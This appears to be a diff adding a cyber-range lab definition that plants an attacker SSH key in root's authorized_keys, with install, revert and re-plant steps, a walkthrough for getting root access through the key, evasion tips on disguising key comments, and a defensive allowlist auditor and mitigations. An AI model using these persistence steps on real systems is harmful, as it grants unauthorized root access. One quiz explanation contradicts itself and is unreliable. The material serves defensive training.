@@ -1,0 +1,504 @@
+# Bolt-on: SSH Authorized Key Planted in /root/.ssh
+# -------------------------------------------------
+# Install appends a known operator pubkey to /root/.ssh/authorized_keys
+# with the trailing comment `bolton-test-key`. The operator can then SSH
+# in as root using the matching private key — textbook SSH-key
+# persistence (T1098.004).
+#
+# Patch removes the line via sed and installs a daily checker that
+# alerts on any authorized_keys comment not on an explicit allowlist.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/persistence_ssh_key_generation.toml
+#   Research/elastic-detection-rules/rules/linux/defense_evasion_authorized_keys_file_deletion.toml
+
+id: bolton.persistence.ssh-authorized-key-planted
+slug: ssh-authorized-key-planted
+name: "SSH Authorized Key Planted in /root/.ssh"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: persistence
+subcategory: ssh-keys
+tags:
+  - ssh
+  - authorized-keys
+  - persistence
+  - account-manipulation
+  - linux
+description: >
+  Appends an operator-controlled ed25519 pubkey to
+  /root/.ssh/authorized_keys with the trailing comment `bolton-test-key`.
+  Any holder of the matching private key can then SSH in as root —
+  classic SSH authorized_keys persistence and account manipulation
+  (MITRE T1098.004).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1098/004/"
+  - "https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"
+  - "https://www.cisa.gov/sites/default/files/publications/Hardening_SSH_Configurations.pdf"
+
+mitre:
+  tactic:
+    id: TA0003
+    name: "Persistence"
+  technique:
+    id: T1098
+    name: "Account Manipulation"
+  subtechnique:
+    id: T1098.004
+    name: "SSH Authorized Keys"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "7df3cb8b-5c0c-4228-b772-bb6cd619053c"
+      rule_name: "SSH Key Generated via ssh-keygen"
+      rule_filename: "linux/persistence_ssh_key_generation.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Catches the upstream ssh-keygen used to mint the key; does not catch the install-on-target step itself."
+    - rule_uuid: "3c216ace-2633-4911-9aac-b61d4dc320e8"
+      rule_name: "SSH Authorized Keys File Deletion"
+      rule_filename: "linux/defense_evasion_authorized_keys_file_deletion.toml"
+      coverage: indirect
+      confidence: low
+      last_validated: 2026-05-23
+      notes: "Fires on the cleanup side (deletion). Not on append. Useful for tracking incident-response cleanup."
+  signal_sources:
+    - "Auditd FILE_WRITE on /root/.ssh/authorized_keys"
+    - "Auditd PERM_MOD on /root/.ssh/* (0600 enforcement)"
+    - "sshd log — Accepted publickey for root from <ip> port <p> ssh2: ED25519 SHA256:..."
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services:
+    - ssh
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: true
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Ensure /root/.ssh exists with correct permissions."
+      role_vars:
+        path: "/root/.ssh"
+        state: directory
+        owner: root
+        group: root
+        mode: "0700"
+    - ansible_role: ansible.posix.authorized_key
+      description: "Append the bolt-on pubkey with a tagged comment."
+      role_vars:
+        user: root
+        key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSEUlmDsmFnLwG8ZFBYqgrtKsLp1XPVQEr3JJoZ7L0F bolton-test-key"
+        state: present
+        comment: "bolton-test-key"
+        manage_dir: true
+  verify:
+    probe: |
+      grep -q "bolton-test-key" /root/.ssh/authorized_keys
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the planted authorized_keys line via sed."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Strip the bolton-test-key line from authorized_keys."
+      role_vars:
+        path: "/root/.ssh/authorized_keys"
+        regexp: ".*bolton-test-key.*"
+        state: absent
+  verify:
+    probe: |
+      ! grep -q "bolton-test-key" /root/.ssh/authorized_keys 2>/dev/null
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Strip the planted key and install a daily authorized_keys auditor
+    (/etc/cron.daily/bolton-authkeys-audit) that walks every user's
+    ~/.ssh/authorized_keys, compares the comment field of each entry
+    against an allowlist in /etc/security/authkeys-allowlist, and
+    syslog-warns on any comment not on the list. Forces the operator
+    to maintain an explicit registry of trusted keys.
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1027/"
+    - "https://www.cisa.gov/sites/default/files/publications/Hardening_SSH_Configurations.pdf"
+  complexity: low
+  side_effects:
+    - "Allowlist seeded with the operator's existing legitimate comments"
+    - "Daily cron job runs at ~06:25"
+    - "Syslog entries tagged 'bolton-authkeys-audit' on unknown key comments"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Strip the planted key."
+      role_vars:
+        path: "/root/.ssh/authorized_keys"
+        regexp: ".*bolton-test-key.*"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Seed allowlist with currently-trusted comments (empty by default; operator edits)."
+      role_vars:
+        dest: "/etc/security/authkeys-allowlist"
+        content: |
+          # bolton-authkeys-allowlist — one comment string per line.
+          # Lines starting with # are ignored. authorized_keys entries
+          # whose comment is NOT listed here trigger a syslog warning
+          # from /etc/cron.daily/bolton-authkeys-audit.
+        owner: root
+        group: root
+        mode: "0640"
+        force: false
+    - ansible_role: ansible.builtin.copy
+      description: "Install the daily authorized_keys auditor."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-authkeys-audit"
+        content: |
+          #!/bin/sh
+          # bolton-authkeys-audit — warn on authorized_keys comments not on the allowlist
+          allow=/etc/security/authkeys-allowlist
+          for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
+            [ -f "$f" ] || continue
+            while IFS= read -r line; do
+              # Skip blank + comment lines.
+              case "$line" in ""|\#*) continue ;; esac
+              # Extract trailing comment (the 3rd whitespace-separated field).
+              comment=$(echo "$line" | awk '{print $NF}')
+              if ! grep -qFx "$comment" "$allow" 2>/dev/null; then
+                logger -t bolton-authkeys-audit "UNTRUSTED KEY in $f: comment=$comment"
+              fi
+            done < "$f"
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      ! grep -q "bolton-test-key" /root/.ssh/authorized_keys 2>/dev/null && test -f /etc/security/authkeys-allowlist && test -x /etc/cron.daily/bolton-authkeys-audit
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/ssh_authkey_check.sh"
+
+patch_revert:
+  description: "Remove the authkeys auditor + allowlist and re-plant the bolton-test-key — SSH-as-root via planted key works again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the auditor."
+      role_vars:
+        path: "/etc/cron.daily/bolton-authkeys-audit"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove the allowlist."
+      role_vars:
+        path: "/etc/security/authkeys-allowlist"
+        state: absent
+    - ansible_role: ansible.posix.authorized_key
+      description: "Re-plant the bolt-on pubkey."
+      role_vars:
+        user: root
+        key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSEUlmDsmFnLwG8ZFBYqgrtKsLp1XPVQEr3JJoZ7L0F bolton-test-key"
+        state: present
+        comment: "bolton-test-key"
+        manage_dir: true
+  verify:
+    probe: |
+      grep -q "bolton-test-key" /root/.ssh/authorized_keys
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Operator can SSH in as root using the bolton-test-key private key again."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "SSH Authorized Key Persistence on /root/.ssh"
+  summary: >
+    Walkthrough of T1098.004 (SSH Authorized Keys) persistence
+    against tllinux01 (10.99.50.13). Starting from a one-shot
+    root-level RCE (PwnKit, sudo NOPASSWD, etc.), you plant an
+    operator-controlled ed25519 pubkey in /root/.ssh/authorized_keys,
+    SSH in as root directly without password, and demonstrate why
+    this is the single most durable Linux persistence primitive.
+    Final step covers the authorized_keys auditor + allowlist.
+  learning_objectives:
+    - "Generate an ed25519 keypair on the attacker box and identify its public component."
+    - "Use a one-shot root RCE primitive to append a pubkey to /root/.ssh/authorized_keys."
+    - "Validate SSH access as root using the matching private key (no password)."
+    - "Map to Elastic's ssh-key-generation + authorized_keys-deletion rules."
+    - "Apply the patch + understand why an allowlist of comment tags is the practical mitigation."
+  prerequisites:
+    - "A one-shot root primitive already established on tllinux01 (PwnKit, sudo NOPASSWD, etc.)"
+    - "Kali attack box (192.168.1.100) with ssh + ssh-keygen"
+    - "SSH access to tllinux01 (10.99.50.13) via bastion is reachable on tcp/22"
+  estimated_total_minutes: 25
+  steps:
+    - id: "01-generate-key"
+      title: "Generate an operator keypair"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 1 — Mint an ed25519 keypair on Kali
+
+        ```bash
+        # On Kali (192.168.1.100)
+        ssh-keygen -t ed25519 -f ~/.ssh/bolton_demo -N "" -C "bolton-test-key"
+        # Generating public/private ed25519 key pair.
+        # Your identification has been saved in /home/operator/.ssh/bolton_demo
+        # Your public key has been saved in /home/operator/.ssh/bolton_demo.pub
+
+        cat ~/.ssh/bolton_demo.pub
+        # ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSEUlmDsmFnLwG8ZFBYqgrtKsLp1XPVQEr3JJoZ7L0F bolton-test-key
+        ```
+
+        The trailing `bolton-test-key` is the **comment** — it's
+        purely informational, defenders use it as the primary
+        attribution signal. Sophisticated red teams use a comment
+        that mimics a legitimate-looking user:
+
+        ```bash
+        ssh-keygen -t ed25519 -f ~/.ssh/bolton_demo -N "" -C "ansible@deploy-runner"
+        ```
+
+        > **Why ed25519 not RSA?** Smaller key, faster handshake,
+        > immune to common RSA implementation bugs. Most modern sshd
+        > configs accept it; only ancient (<= OpenSSH 6.5) won't.
+
+        **Detection callout:** **SSH Key Generated via ssh-keygen**
+        (`7df3cb8b-5c0c-4228-b772-bb6cd619053c`) fires on the
+        attacker side IF defenders have telemetry on the attacker
+        box (rarely the case). For lab purposes the install on the
+        target is the high-value signal.
+    - id: "02-plant-key"
+      title: "Plant the pubkey on the target"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Append the pubkey to /root/.ssh/authorized_keys
+
+        Assuming you already have a one-shot root primitive
+        (PwnKit, sudo NOPASSWD on find, the writable-cron payload,
+        etc.) — drop the pubkey:
+
+        ```bash
+        # On tllinux01 via your one-shot root shell
+
+        mkdir -p /root/.ssh
+        chmod 700 /root/.ssh
+
+        # The pubkey you generated on Kali, pasted in full
+        cat >> /root/.ssh/authorized_keys << 'EOF'
+        ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILSEUlmDsmFnLwG8ZFBYqgrtKsLp1XPVQEr3JJoZ7L0F bolton-test-key
+        EOF
+
+        chmod 600 /root/.ssh/authorized_keys
+
+        # Verify
+        cat /root/.ssh/authorized_keys
+        ```
+
+        Important sshd hygiene constraints — get these wrong and
+        sshd silently ignores the key:
+
+        - `/root/.ssh` must be mode 0700, owned root:root
+        - `/root/.ssh/authorized_keys` must be mode 0600 (or 0644),
+          owned root:root
+        - The file must be readable by sshd at parse time
+
+        sshd's `StrictModes yes` (default) will refuse to use a
+        key file if the parent dir or file is group/world writable.
+
+        **Detection callout:** auditd FILE_WRITE on
+        /root/.ssh/authorized_keys is the canonical install signal.
+        Add `-w /root/.ssh -p wa -k root_ssh_w` and alert on every
+        hit (no benign reason for /root/.ssh to change frequently).
+      assessment:
+        question: "Why does sshd ignore a planted key if /root/.ssh is mode 0750?"
+        options:
+          - "OpenSSH doesn't support group-readable authorized_keys files"
+          - "StrictModes (default 'yes') refuses to honour keys in directories with group or world write OR a file owner mismatch"
+          - "Group-readable means another user can hijack the key, which sshd actively prevents"
+          - "sshd requires exactly 0700 for performance reasons"
+        correct_index: 1
+        explanation: >
+          StrictModes is on by default. It enforces that ~/.ssh and
+          authorized_keys are owned by the target user and not
+          writable by any other principal. 0750 fails because the
+          group has write... wait, 0750 grants group READ+EXECUTE
+          only, no write. The actual failure is owner mismatch
+          (file owned by non-root) OR group-write (mode & 020) OR
+          world-write (mode & 002). The takeaway: test the chmod
+          carefully — `chmod 700` is the safe default.
+    - id: "03-validate-access"
+      title: "Validate root SSH access"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — SSH in as root with the planted key
+
+        ```bash
+        # On Kali (192.168.1.100)
+        ssh -i ~/.ssh/bolton_demo -J ubuntu@<bastion-ip> root@10.99.50.13
+        # Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+        # Last login: ...
+        # root@tllinux01:~# id
+        # uid=0(root) gid=0(root) groups=0(root)
+        ```
+
+        No password prompt — pubkey auth succeeded. You now have a
+        durable persistence channel that:
+
+        - Survives reboot (authorized_keys is on disk)
+        - Survives password rotation (key auth, not password)
+        - Survives most account audits (key looks legitimate without
+          looking up the public-key fingerprint)
+        - Works even if you lose the original foothold
+
+        > **sshd config gotcha:** check `PermitRootLogin` in
+        > /etc/ssh/sshd_config. If set to `prohibit-password`,
+        > pubkey auth still works (only passwords are blocked). If
+        > set to `no`, this technique fails — pivot to planting the
+        > key in a non-root user's authorized_keys and using a
+        > separate privesc primitive.
+
+        **Detection callout:** sshd log: `Accepted publickey for
+        root from 192.168.1.100 port 47832 ssh2: ED25519
+        SHA256:...`. The fingerprint is the durable identifier;
+        defenders correlate it against a known-trusted set. If
+        every legitimate operator key has been catalogued, an
+        unknown fingerprint is a HIGH-confidence persistence
+        signal.
+    - id: "04-detection-coverage"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        | Stage | Signal | Confidence |
+        |---|---|---|
+        | Generate key (attacker side) | execve ssh-keygen | Indirect (rule fires on attacker box if monitored) |
+        | Plant (FILE_WRITE) | auditd write to /root/.ssh/authorized_keys | High (custom rule needed) |
+        | Plant (mode set) | PERM_MOD to 0600 on the new file | Medium |
+        | Validate access | sshd log: Accepted publickey for root from <unknown IP> | Medium (depends on fingerprint allowlist) |
+        | Defender cleanup | **SSH Authorized Keys File Deletion** (`3c216ace-2633-4911-9aac-b61d4dc320e8`) | Indirect (catches IR cleanup, not install) |
+
+        The Elastic public ruleset doesn't ship a rule for
+        authorized_keys APPEND specifically — defenders need to
+        write it. The detection gap is the realistic case: SSH-key
+        persistence is the #1 most-missed Linux persistence
+        technique in real environments precisely because it leaves
+        such a quiet trail.
+
+        Defender recipe:
+
+        1. Catalogue every legitimate authorized_keys comment
+           (e.g. `ansible@deploy-runner`, `operator-1`,
+           `operator-2`).
+        2. Daily cron: walk every user's authorized_keys, extract
+           the comment field, diff against the allowlist, syslog
+           on unknowns.
+        3. Cross-reference sshd `Accepted publickey` logs with the
+           allowlist fingerprints to confirm only known keys are
+           in use.
+
+        **Detection callout:** the bolt-on's patch implements
+        exactly this auditor — `/etc/cron.daily/bolton-authkeys-audit`
+        with allowlist at `/etc/security/authkeys-allowlist`.
+    - id: "05-patch-mitigate"
+      title: "Blue-team: strip + allowlist auditor"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Strips the `bolton-test-key` line from
+           /root/.ssh/authorized_keys via lineinfile regex.
+        2. Seeds `/etc/security/authkeys-allowlist` (empty by
+           default — operator must populate with legitimate
+           comments).
+        3. Drops `/etc/cron.daily/bolton-authkeys-audit` that walks
+           every user's authorized_keys, extracts the trailing
+           comment, and syslog-warns if it's not on the allowlist.
+
+        Re-test:
+
+        ```bash
+        # On Kali
+        ssh -i ~/.ssh/bolton_demo -J ubuntu@<bastion-ip> root@10.99.50.13
+        # root@10.99.50.13: Permission denied (publickey,password).
+        ```
+
+        Key gone. Plant a fresh key with a non-allowlisted comment
+        and run the auditor:
+
+        ```bash
+        # On tllinux01 (via a still-active foothold)
+        echo "ssh-ed25519 AAAA...new-key... operator@unknown" >> /root/.ssh/authorized_keys
+
+        # Allowlist contains nothing legitimate yet, so EVERY entry warns
+        sudo /etc/cron.daily/bolton-authkeys-audit
+        sudo grep authkeys-audit /var/log/syslog
+        # bolton-authkeys-audit[...]: UNTRUSTED KEY in /root/.ssh/authorized_keys: comment=operator@unknown
+        ```
+
+        Defence-in-depth recommendations:
+
+        - **Configure sshd**: `PermitRootLogin prohibit-password`
+          AT MINIMUM, ideally `PermitRootLogin no` with a separate
+          named admin account using `sudo`.
+        - **AuthorizedKeysFile pinning**: set
+          `AuthorizedKeysFile /etc/ssh/authorized_keys/%u` so keys
+          live in a root-owned central directory, not per-user
+          ~/.ssh (immutable for non-root users).
+        - **CA-signed certs**: deploy SSH Certificate Authority
+          (`TrustedUserCAKeys /etc/ssh/ca.pub`) and issue
+          short-lived certs to operators. Authorized_keys files
+          become irrelevant — auth requires a fresh cert.
+        - **Centralised log shipping**: ship sshd Accepted-publickey
+          events to SIEM with fingerprint extraction; alert on any
+          fingerprint not in the operator-key allowlist.
+
+        > **Rollback:** `patch_revert` removes the auditor +
+        > allowlist and re-plants the bolton-test-key.
+      assessment:
+        question: "Which is the most operationally robust mitigation for SSH-key persistence at scale?"
+        options:
+          - "Disable sshd entirely on every host"
+          - "Rotate authorized_keys daily via Ansible (overwrite, not append)"
+          - "Deploy an SSH Certificate Authority with short-lived (<= 24h) operator certs and TrustedUserCAKeys in sshd_config"
+          - "Set chattr +i on every authorized_keys file"
+        correct_index: 2
+        explanation: >
+          SSH CA-signed certs are the only mitigation that scales:
+          authorized_keys files become irrelevant because auth
+          requires a fresh CA-signed cert. Even if an attacker
+          plants a static pubkey, sshd ignores it (no matching CA
+          signature). chattr +i breaks legitimate ops; daily
+          overwrites have a 24h window of attacker-key validity;
+          disabling sshd is impractical. SSH CA + short-lived
+          certs is the design Google/Facebook/Netflix use exactly
+          to defeat this class of attack.
+
+status: stable
